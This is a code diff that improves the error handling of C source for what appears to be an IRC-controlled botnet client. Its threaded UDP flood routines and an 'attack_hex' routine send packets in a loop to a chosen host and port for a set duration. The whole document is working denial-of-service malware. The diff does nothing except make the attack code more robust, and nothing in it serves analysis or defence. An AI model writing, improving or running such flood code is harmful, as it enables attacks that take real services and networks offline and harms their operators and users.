@@ -41,11 +41,12 @@ void generate_random_nick(char *nick, size_t length) {
 void *udp_flood_thread(void *arg) {
     struct sockaddr_in addr;
     int sockfd;
-    char payload[] = "A";  // Payload for UDP flood
+    char payload[] = "A";  // Simple payload for UDP flood
     int timeout = ((int*)arg)[0];
     const char *host = ((char**)arg)[1];
     int port = ((int*)arg)[2];
 
+    // Create socket
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         perror("Socket error");
@@ -54,13 +55,19 @@ void *udp_flood_thread(void *arg) {
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-    inet_pton(AF_INET, host, &addr.sin_addr);
+    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
+        perror("inet_pton error");
+        close(sockfd);
+        return NULL;
+    }
 
     printf("Starting UDP flood to %s:%d for %d seconds...\n", host, port, timeout);  // Debugging output
 
     time_t end_time = time(NULL) + timeout;
     while (time(NULL) < end_time) {
-        sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
+        if (sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+            perror("sendto error");
+        }
     }
 
     close(sockfd);
@@ -71,13 +78,16 @@ void *udp_flood_thread(void *arg) {
 void udp_flood_manager(const char *host, int port, int timeout, int max_threads) {
     pthread_t threads[max_threads];
     int thread_args[max_threads][3];
+    char *host_str = (char *)host;
     int i;
 
     for (i = 0; i < max_threads; i++) {
         thread_args[i][0] = timeout;
-        thread_args[i][1] = (int)host; // Cast to int for simplicity
+        thread_args[i][1] = (int)host_str; // Cast to int for simplicity
         thread_args[i][2] = port;
-        pthread_create(&threads[i], NULL, udp_flood_thread, (void *)thread_args[i]);
+        if (pthread_create(&threads[i], NULL, udp_flood_thread, (void *)thread_args[i]) != 0) {
+            perror("pthread_create error");
+        }
     }
 
     for (i = 0; i < max_threads; i++) {
@@ -91,6 +101,7 @@ void attack_hex(const char *host, int port, int duration) {
     struct sockaddr_in addr;
     char payload[] = "\x55\x55\x55\x55\x00\x00\x00\x01";
 
+    // Create socket
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         perror("Socket error");
@@ -99,13 +110,19 @@ void attack_hex(const char *host, int port, int duration) {
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-    inet_pton(AF_INET, host, &addr.sin_addr);
+    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
+        perror("inet_pton error");
+        close(sockfd);
+        return;
+    }
 
     printf("Starting HEX attack to %s:%d for %d seconds...\n", host, port, duration);  // Debugging output
 
     time_t end_time = time(NULL) + duration;
     while (time(NULL) < end_time) {
-        sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
+        if (sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+            perror("sendto error");
+        }
     }
 
     close(sockfd);
@@ -163,7 +180,10 @@ int main() {
     // Main loop to receive data and respond to server pings
     while (1) {
         bzero(recv_buffer, sizeof(recv_buffer));
-        read(sockfd, recv_buffer, sizeof(recv_buffer) - 1);
+        if (read(sockfd, recv_buffer, sizeof(recv_buffer) - 1) <= 0) {
+            perror("read error");
+            break;
+        }
 
         // Respond to PING messages
         if (strncmp(recv_buffer, "PING", 4) == 0) {
